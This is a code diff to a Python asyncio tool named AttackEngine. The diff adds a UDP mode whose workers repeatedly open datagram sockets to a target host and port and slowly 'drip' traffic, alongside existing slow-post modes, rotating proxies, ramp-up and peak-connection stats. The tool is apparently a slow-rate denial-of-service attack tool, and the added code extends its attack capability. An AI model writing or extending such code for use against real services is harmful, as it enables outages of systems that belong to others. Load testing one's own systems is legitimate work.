@@ -9,7 +9,7 @@ import ssl
 import sys
 import time
 
-from . import conn
+from . import conn, udp
 from .config import Config
 from .profiles import PROFILES
 from .proxies import ProxyPool
@@ -25,8 +25,9 @@ class AttackEngine:
         self.stats = Stats()
         self._pool = ProxyPool(config.proxies, config.rotate_proxies) if config.proxies else None
         self._circuit_breaker_triggered = False
-        # Cache profile instance (profiles are stateless, no need to recreate per connection)
-        self._profile = PROFILES[config.mode]()
+        # Cache profile instance (profiles are stateless; UDP does not use the
+        # reader/writer profile machinery, so fall back to a harmless default).
+        self._profile = PROFILES[config.mode]() if config.mode != "udp" else PROFILES["slow-post"]()
 
     async def run(self) -> None:
         # Stagger worker starts if ramp-up is enabled
@@ -71,6 +72,10 @@ class AttackEngine:
             self.stats.circuit_breaker = True
 
     async def _worker(self, idx: int) -> None:
+        # UDP mode uses a datagram transport (no reader/writer streams).
+        if self.config.mode == "udp":
+            await self._udp_worker(idx)
+            return
         config = self.config
         consecutive_errors = 0
         backoff_time = 0.3  # Initial backoff
@@ -140,6 +145,66 @@ class AttackEngine:
                     except OSError:
                         pass
                     self.stats.active = max(0, self.stats.active - 1)
+
+    async def _udp_worker(self, idx: int) -> None:
+        """UDP mode worker: repeatedly open a datagram socket and slowly drip.
+
+        Mirrors ``_worker``'s lifetime/stats/backoff handling but replaces the
+        TCP stream with a real connected UDP socket so the datagram traffic is
+        genuinely sent over the network.
+        """
+        config = self.config
+        consecutive_errors = 0
+        backoff_time = 0.3
+        transport = None
+        while not self.stop.is_set():
+            if config.max_errors > 0 and consecutive_errors >= config.max_errors:
+                if config.verbose:
+                    print(
+                        f"  [w{idx}] Circuit breaker: {consecutive_errors} consecutive errors, exiting",
+                        flush=True,
+                    )
+                self._circuit_breaker_triggered = True
+                self.stop.set()
+                return
+
+            try:
+                transport, _ = await udp.open_datagram(
+                    config.host,
+                    config.port,
+                    connect_timeout=config.connect_timeout,
+                    stats=self.stats,
+                )
+                self.stats.connections += 1
+                self.stats.active += 1
+                self.stats.peak_active = max(self.stats.peak_active, self.stats.active)
+                consecutive_errors = 0
+                backoff_time = 0.3
+
+                completed = await udp.drip(transport, config, self.stats, self.stop)
+                if completed:
+                    self.stats.completed += 1
+            except asyncio.CancelledError:
+                raise
+            except (TimeoutError, ConnectionError, OSError) as exc:
+                self.stats.errors += 1
+                consecutive_errors += 1
+                if config.verbose:
+                    print(
+                        f"  [w{idx}] {type(exc).__name__}: {exc} (consecutive: {consecutive_errors})",
+                        flush=True,
+                    )
+                backoff_time = min(backoff_time * 2, 30.0)
+                jitter = random.uniform(0.1, 0.3) * backoff_time
+                await asyncio.sleep(backoff_time + jitter)
+            finally:
+                if transport is not None:
+                    try:
+                        transport.close()
+                    except OSError:
+                        pass
+                    self.stats.active = max(0, self.stats.active - 1)
+                    transport = None
 
     async def _report(self) -> None:
         config = self.config
